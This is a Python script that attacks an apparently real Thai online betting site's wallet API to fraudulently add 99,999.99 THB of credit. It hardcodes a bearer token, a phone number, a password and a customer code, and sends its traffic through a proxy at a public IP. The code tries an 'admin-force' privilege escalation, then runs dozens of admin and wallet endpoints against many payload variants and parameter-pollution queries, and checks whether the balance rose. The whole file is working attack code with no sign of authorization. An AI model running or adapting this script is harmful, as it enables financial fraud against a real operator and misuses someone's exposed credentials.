#!/usr/bin/env python3

import requests
import json
import time
import sys
from urllib.parse import urljoin

# Configuration
TARGET_DOMAIN = "https://jklmn23456.com"
FRONTEND_DOMAIN = "https://pigslot.co"
CUSTOMER_CODE = "PS663888386"
PHONE_NUMBER = "0960422161"
EXISTING_TOKEN = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3NTYyODE3NTAsInBob25lX251bWJlciI6IjA5NjA0MjIxNjEiLCJ1c2VyX3VpZCI6ImRjZmQ0MzI0LWJjMjMtNDQ1OS1hMjE0LTA3Yjg0NWIwZmZiMiIsImN1c3RvbWVyX2NvZGUiOiJQUzY2Mzg4ODM4NiIsImdhbWVfdG9rZW4iOiJnYW1lLTM4NTc1ZjQ0LTEwMjUtNDA1Yi04MjY2LTRiODI3OGMwZDc4NCJ9.IyZ8E-6rBsH7S1fqpMwrMYWoI8pVuB2Z3bXvE0F7Ndw"

# ZAP Proxy Configuration
ZAP_PROXY_HOST = '46.202.177.106'
ZAP_PROXY_PORT = 8080
PROXIES = {
    'http': f'http://{ZAP_PROXY_HOST}:{ZAP_PROXY_PORT}',
    'https': f'http://{ZAP_PROXY_HOST}:{ZAP_PROXY_PORT}',
}

TARGET_CREDIT_AMOUNT = 99999.99

def print_info(message): print(f"\033[1;34m[+] {message}\033[0m")
def print_success(message): print(f"\033[1;32m[+] {message}\033[0m")
def print_warning(message): print(f"\033[1;33m[!] {message}\033[0m")
def print_error(message): print(f"\033[1;31m[-] {message}\033[0m")

def get_session():
    """Create session with proxy and auth"""
    session = requests.Session()
    session.proxies = PROXIES
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'th,en;q=0.9',
        'Cache-Control': 'no-cache',
        'Origin': FRONTEND_DOMAIN,
        'Referer': f'{FRONTEND_DOMAIN}/',
        'Authorization': f'bearer {EXISTING_TOKEN}',
        'Username': PHONE_NUMBER,
        'Password': '181242',
        'Content-Type': 'application/json',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'cross-site',
    })
    return session

def test_admin_force_first():
    """Activate admin-force first"""
    print_info("Activating admin-force for privilege escalation...")
    session = get_session()
    
    try:
        admin_force_url = f"{FRONTEND_DOMAIN}/admin-force"
        response = session.get(admin_force_url, timeout=15, verify=False)
        
        if response.status_code == 200 and 'admin' in response.text.lower():
            print_success("✅ Admin-force activated - Admin privileges granted")
            return True
    except Exception as e:
        print_error(f"Admin-force activation failed: {e}")
    
    return False

def check_current_balance():
    """Check current wallet balance"""
    print_info("Checking current wallet balance...")
    session = get_session()
    
    balance_endpoints = [
        f"/api/v1/wallet/{CUSTOMER_CODE}/balance",
        f"/api/v1/loyalty/{CUSTOMER_CODE}/balance",
        f"/api/v1/user/{CUSTOMER_CODE}/wallet",
        f"/api/v1/account/{CUSTOMER_CODE}/balance"
    ]
    
    for endpoint in balance_endpoints:
        try:
            url = f"{TARGET_DOMAIN}{endpoint}"
            response = session.get(url, timeout=10, verify=False)
            
            if response.status_code == 200:
                try:
                    data = response.json()
                    if data.get('status') == 'SUCCESS':
                        balance = data.get('data', {}).get('balance', 0)
                        print_success(f"Current balance: {balance} THB (from {endpoint})")
                        return balance, endpoint
                except:
                    pass
        except:
            continue
    
    print_warning("Could not retrieve current balance")
    return 0, None

def test_credit_addition_comprehensive():
    """Comprehensive credit addition testing"""
    print_info(f"Testing credit addition of {TARGET_CREDIT_AMOUNT} THB...")
    session = get_session()
    
    # Comprehensive list of endpoints to test
    credit_endpoints = [
        # Wallet endpoints
        f"/api/v1/wallet/{CUSTOMER_CODE}/add",
        f"/api/v1/wallet/{CUSTOMER_CODE}/credit",
        f"/api/v1/wallet/{CUSTOMER_CODE}/deposit",
        f"/api/v1/wallet/{CUSTOMER_CODE}/topup",
        f"/api/v1/wallet/{CUSTOMER_CODE}/balance/add",
        
        # Admin wallet endpoints
        f"/api/v1/admin/wallet/{CUSTOMER_CODE}/add",
        f"/api/v1/admin/wallet/{CUSTOMER_CODE}/credit",
        f"/api/v1/admin/wallet/{CUSTOMER_CODE}/adjust",
        f"/api/v1/admin/wallet/add",
        f"/api/v1/admin/wallet/credit",
        
        # Transaction endpoints
        f"/api/v1/transaction/{CUSTOMER_CODE}/add",
        f"/api/v1/transaction/add",
        f"/api/v1/admin/transaction/add",
        f"/api/v1/admin/transaction/credit",
        
        # Loyalty/VIP endpoints
        f"/api/v1/loyalty/{CUSTOMER_CODE}/credit/add",
        f"/api/v1/loyalty/{CUSTOMER_CODE}/bonus",
        f"/api/v1/loyalty/credit/add",
        f"/api/v1/admin/loyalty/credit/add",
        
        # Payment endpoints
        f"/api/v1/payment/{CUSTOMER_CODE}/credit",
        f"/api/v1/payment/add",
        f"/api/v1/admin/payment/add",
        
        # Credit endpoints
        f"/api/v1/credit/add",
        f"/api/v1/admin/credit/add",
        f"/api/v1/admin/credit/manual",
        
        # Account endpoints
        f"/api/v1/account/{CUSTOMER_CODE}/credit",
        f"/api/v1/account/credit/add",
        f"/api/v1/admin/account/credit"
    ]
    
    # Comprehensive payload variations
    payload_variations = [
        # Standard formats
        {"amount": TARGET_CREDIT_AMOUNT},
        {"credit": TARGET_CREDIT_AMOUNT},
        {"balance": TARGET_CREDIT_AMOUNT},
        {"value": TARGET_CREDIT_AMOUNT},
        {"add_amount": TARGET_CREDIT_AMOUNT},
        
        # With customer code
        {"amount": TARGET_CREDIT_AMOUNT, "customer_code": CUSTOMER_CODE},
        {"credit": TARGET_CREDIT_AMOUNT, "customer_code": CUSTOMER_CODE},
        
        # With transaction details
        {"amount": TARGET_CREDIT_AMOUNT, "type": "credit", "reason": "admin_adjustment"},
        {"amount": TARGET_CREDIT_AMOUNT, "transaction_type": "credit"},
        {"amount": TARGET_CREDIT_AMOUNT, "method": "admin"},
        
        # With admin flags
        {"amount": TARGET_CREDIT_AMOUNT, "admin": True},
        {"amount": TARGET_CREDIT_AMOUNT, "admin_add": True},
        {"amount": TARGET_CREDIT_AMOUNT, "force": True},
        
        # Different naming conventions
        {"deposit_amount": TARGET_CREDIT_AMOUNT},
        {"topup_amount": TARGET_CREDIT_AMOUNT},
        {"bonus_amount": TARGET_CREDIT_AMOUNT},
        {"adjustment_amount": TARGET_CREDIT_AMOUNT},
        
        # With action specifiers
        {"amount": TARGET_CREDIT_AMOUNT, "action": "add"},
        {"amount": TARGET_CREDIT_AMOUNT, "action": "credit"},
        {"amount": TARGET_CREDIT_AMOUNT, "operation": "add"},
        
        # Thai specific
        {"amount": TARGET_CREDIT_AMOUNT, "currency": "THB"},
        {"amount": TARGET_CREDIT_AMOUNT, "เครดิต": TARGET_CREDIT_AMOUNT},
        
        # VIP related
        {"amount": TARGET_CREDIT_AMOUNT, "vip_bonus": True},
        {"amount": TARGET_CREDIT_AMOUNT, "loyalty_credit": True}
    ]
    
    print_info(f"Testing {len(credit_endpoints)} endpoints with {len(payload_variations)} payload variations...")
    
    successful_attempts = []
    
    for endpoint in credit_endpoints:
        url = f"{TARGET_DOMAIN}{endpoint}"
        
        for i, payload in enumerate(payload_variations):
            try:
                # Test POST
                response = session.post(url, json=payload, timeout=10, verify=False)
                
                if response.status_code == 200:
                    try:
                        result = response.json()
                        if result.get('status') == 'SUCCESS':
                            print_success(f"🎯 CREDIT ADDITION SUCCESSFUL!")
                            print_success(f"Endpoint: {endpoint}")
                            print_success(f"Method: POST")
                            print_success(f"Payload: {payload}")
                            print_success(f"Response: {result}")
                            successful_attempts.append({
                                'endpoint': endpoint,
                                'method': 'POST',
                                'payload': payload,
                                'response': result
                            })
                            return True
                    except:
                        pass
                
                # Test PUT
                response = session.put(url, json=payload, timeout=10, verify=False)
                
                if response.status_code == 200:
                    try:
                        result = response.json()
                        if result.get('status') == 'SUCCESS':
                            print_success(f"🎯 CREDIT ADDITION SUCCESSFUL (PUT)!")
                            print_success(f"Endpoint: {endpoint}")
                            print_success(f"Method: PUT")
                            print_success(f"Payload: {payload}")
                            print_success(f"Response: {result}")
                            successful_attempts.append({
                                'endpoint': endpoint,
                                'method': 'PUT',
                                'payload': payload,
                                'response': result
                            })
                            return True
                    except:
                        pass
                
                # Test PATCH
                response = session.patch(url, json=payload, timeout=10, verify=False)
                
                if response.status_code == 200:
                    try:
                        result = response.json()
                        if result.get('status') == 'SUCCESS':
                            print_success(f"🎯 CREDIT ADDITION SUCCESSFUL (PATCH)!")
                            print_success(f"Endpoint: {endpoint}")
                            print_success(f"Method: PATCH")
                            print_success(f"Payload: {payload}")
                            print_success(f"Response: {result}")
                            successful_attempts.append({
                                'endpoint': endpoint,
                                'method': 'PATCH',
                                'payload': payload,
                                'response': result
                            })
                            return True
                    except:
                        pass
                        
            except Exception as e:
                continue
        
        # Progress indicator
        if (credit_endpoints.index(endpoint) + 1) % 10 == 0:
            print_info(f"Tested {credit_endpoints.index(endpoint) + 1}/{len(credit_endpoints)} endpoints...")
    
    if successful_attempts:
        print_success(f"Found {len(successful_attempts)} successful credit manipulation methods!")
        return True
    
    return False

def test_parameter_pollution_credit():
    """Test parameter pollution for credit manipulation"""
    print_info("Testing parameter pollution for credit manipulation...")
    session = get_session()
    
    base_url = f"{TARGET_DOMAIN}/api/v1/wallet/{CUSTOMER_CODE}/balance"
    
    # Parameter pollution techniques
    pollution_tests = [
        f"?amount={TARGET_CREDIT_AMOUNT}&admin=true&amount={TARGET_CREDIT_AMOUNT}",
        f"?customer_code=admin&customer_code={CUSTOMER_CODE}&amount={TARGET_CREDIT_AMOUNT}",
        f"?amount={TARGET_CREDIT_AMOUNT}&user_type=admin&override=true",
        f"?amount={TARGET_CREDIT_AMOUNT}&force=true&admin_add=true",
        f"?amount={TARGET_CREDIT_AMOUNT}&vip_level=ADMIN&credit=true"
    ]
    
    for pollution in pollution_tests:
        try:
            url = base_url + pollution
            response = session.get(url, timeout=10, verify=False)
            
            if response.status_code == 200:
                try:
                    data = response.json()
                    if data.get('status') == 'SUCCESS':
                        print_success(f"🎯 Parameter pollution successful!")
                        print_success(f"URL: {url}")
                        print_success(f"Response: {data}")
                        return True
                except:
                    pass
        except:
            continue
    
    return False

def verify_balance_change():
    """Verify if balance changed after attempts"""
    print_info("Verifying balance changes...")
    
    new_balance, endpoint = check_current_balance()
    
    if new_balance >= TARGET_CREDIT_AMOUNT:
        print_success(f"🎯 CREDIT MANIPULATION CONFIRMED!")
        print_success(f"New balance: {new_balance} THB")
        print_success(f"Target amount: {TARGET_CREDIT_AMOUNT} THB")
        return True
    
    return False

def main():
    print_info("🎯 Comprehensive Credit Manipulation Test")
    print_info("=" * 60)
    print_info(f"Target Amount: {TARGET_CREDIT_AMOUNT} THB")
    print_info(f"Customer Code: {CUSTOMER_CODE}")
    print_info(f"Phone: {PHONE_NUMBER}")
    
    # Step 1: Activate admin-force
    print_info("\n🔥 Step 1: Activating admin-force for privilege escalation...")
    admin_activated = test_admin_force_first()
    
    # Step 2: Check current balance
    print_info("\n💰 Step 2: Checking current balance...")
    current_balance, balance_endpoint = check_current_balance()
    
    # Step 3: Comprehensive credit testing
    print_info("\n🎯 Step 3: Comprehensive credit manipulation testing...")
    credit_success = test_credit_addition_comprehensive()
    
    # Step 4: Parameter pollution testing
    if not credit_success:
        print_info("\n🔧 Step 4: Testing parameter pollution...")
        pollution_success = test_parameter_pollution_credit()
    else:
        pollution_success = False
    
    # Step 5: Verify balance changes
    print_info("\n✅ Step 5: Verifying balance changes...")
    balance_changed = verify_balance_change()
    
    # Final Summary
    print_info("\n" + "=" * 60)
    print_info("🎯 CREDIT MANIPULATION SUMMARY")
    print_info("=" * 60)
    
    if admin_activated:
        print_success("✅ Admin-force privilege escalation: SUCCESS")
    else:
        print_warning("❌ Admin-force privilege escalation: FAILED")
    
    print_info(f"💰 Original balance: {current_balance} THB")
    
    if credit_success:
        print_success("✅ Direct credit manipulation: SUCCESS")
    elif pollution_success:
        print_success("✅ Parameter pollution credit manipulation: SUCCESS")
    else:
        print_warning("❌ Credit manipulation attempts: FAILED")
    
    if balance_changed:
        print_success("🎯 BALANCE VERIFICATION: CREDIT SUCCESSFULLY ADDED!")
        print_success(f"🎉 VULNERABILITY CONFIRMED: {TARGET_CREDIT_AMOUNT} THB ADDED!")
    else:
        print_warning("❌ Balance verification: No significant change detected")
    
    if any([credit_success, pollution_success, balance_changed]):
        print_success("\n🚨 CRITICAL VULNERABILITY CONFIRMED!")
        print_success("💰 CREDIT MANIPULATION IS POSSIBLE!")
        print_success("🎯 FINANCIAL SYSTEM COMPROMISED!")
    else:
        print_info("\n🛡️ Credit manipulation attempts were unsuccessful")
        print_info("💼 Financial system appears secure against tested methods")
    
    print_info("\n📊 Check ZAP GUI for all captured traffic and API calls!")

if __name__ == "__main__":
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    main()